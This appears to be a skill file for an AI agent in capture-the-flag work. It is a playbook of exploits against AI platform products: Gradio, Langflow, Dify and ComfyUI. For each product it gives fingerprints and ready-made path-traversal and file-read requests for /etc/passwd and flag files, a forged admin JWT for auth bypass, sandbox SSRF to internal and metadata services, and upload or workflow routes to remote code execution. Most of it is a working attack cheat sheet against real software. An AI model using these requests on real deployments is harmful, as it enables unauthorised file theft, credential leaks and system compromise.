name: ai-platform-cve
description: Exploit knowledge for AI/LLM platform products (Dify, Langflow, Gradio, ComfyUI). The c-series challenges are hosted AI platforms with known path-traversal / auth-bypass / file-read flaws. Each entry gives the product tell, the vulnerable endpoint, and the flag-read path. "Know the endpoint = instant solve".
---

# AI Platform CVE (Dify / Langflow / Gradio / ComfyUI)

Authorized CTF/assessment use. c-series targets are AI platform products. Their vulns are mostly path traversal / LFI / auth bypass on the file & upload endpoints. Identify the product, hit the traversal, read the flag. Do NOT waste time on the chat UI.

## 1. Gradio (Python web UI) — LFI via /file & symlink

**Fingerprint:** title "Gradio", `/gradio_api/`, `/file=`, `/config` routes, a Python ML demo UI.

**LFI (the classic, CVE-2023-51449):**
```
GET /file=/etc/passwd                      → direct read
GET /file=/app/flag.txt                    → flag
GET /file=../../../../etc/passwd           → traversal variants
```
**The symlink trick (when direct path is blocked):** if `/file=` refuses absolute paths, create a symlink inside the allowed dir pointing to the flag, then read it:
```
# via a code-exec / upload primitive, or if you can write anywhere gradio serves:
ln -s /flag.txt /tmp/gradio/leak.txt
GET /file=leak.txt
```
**Upload → RCE:** Gradio `/upload` + `/api/predict` (or a python-block component) can run arbitrary code via a crafted `.py`/pickle — if reachable, use it to read the flag directly.

**Verify:** `/file=/etc/passwd` returns `root:x:0:0` → LFI confirmed → read flag path.

## 2. Langflow (no/low-code LLM flows) — auth bypass + file read

**Fingerprint:** title "Langflow", `/api/v1/`, `/login` page with Langflow branding, `/flows`.

**Auth bypass (needs "admin JWT"):**
- Default/blank JWT: the API may accept an unauthenticated or self-signed JWT with `{"sub":"admin"}` / role claim. Craft one and hit `/api/v1/...`.
- Default creds / reset: try `admin` / default secret, or the documented dev token.

**File read / traversal on files endpoints:**
```
GET /api/v1/files/list?path=../../../../   → enumerate
GET /api/v1/files/download/../../flag.txt  → read
```
**Config leak:** `/api/v1/config` or the flow export endpoint can dump secrets (API keys, DB creds) → escalate.

**Verify:** access an admin-only endpoint with the forged JWT returns data → auth bypass confirmed → read flag/config.

## 3. Dify (LLM app platform) — file read + sandbox SSRF

**Fingerprint:** title "Dify", `/console`, `/v1/`, `/files/`, `/api/`, "Dify" in page.

**File read / traversal:**
```
GET /files/upload/<id>          → uploaded file access (check for idor)
GET /files/...                  → traversal to flag
GET /console/api/...            → console API without auth
```
**Sandbox SSRF:** Dify runs code in a sandbox; the code-exec endpoint can be pointed at internal services (metadata service, internal API, the flag host) — SSRF to reach `127.0.0.1` internal endpoints.

**Info leak endpoints:** `/console/api/setup` (setup status), `/v1/info` (version), `/console/api/apps` (if auth bypassed) — enumerate apps & datasets that may hold the flag.

**Note on the "crash-loop" case:** if the Dify backend API itself is down (503/crash-loop), the challenge may still expose a secondary service or a static flag in an accessible path — enumerate adjacent ports and endpoints rather than waiting on the dead API.

**Verify:** confirm the traversal returns file content; confirm SSRF reaches internal targets with a probe first.

## 4. ComfyUI (Stable Diffusion workflow) — file read/upload traversal

**Fingerprint:** title "ComfyUI", `/api/prompt`, `/view`, `/upload/image`, `/embeddings`, the workflow graph UI.

**File read:**
```
GET /view?filename=../../flag.txt&type=input   → read arbitrary file
GET /view?filename=flag.txt&subfolder=&type=output
```
**Upload traversal / RCE:** `/upload/image` with a `subfolder`/`type` traversal can write a file (or a `.py`/workflow that runs) → RCE.

**Workflow code exec:** ComfyUI executes custom node Python — a crafted workflow JSON with a malicious node runs arbitrary Python → read flag.

**Verify:** `/view?filename=/etc/passwd` returns passwd → traversal confirmed → read flag.

## Cross-cutting
- **Product tell first** (title/route), then hit the exact traversal/read endpoint — don't poke the UI.
- **`/etc/passwd` is the universal probe** for every LFI here: if it returns, you have read; walk to the flag path next.
- **Flag path guesses:** `/flag`, `/flag.txt`, `/app/flag*`, `/root/flag*`, `/challenge/flag*` — but read config/source to confirm.
- **Self-verify** the read before assuming; then submit the flag.
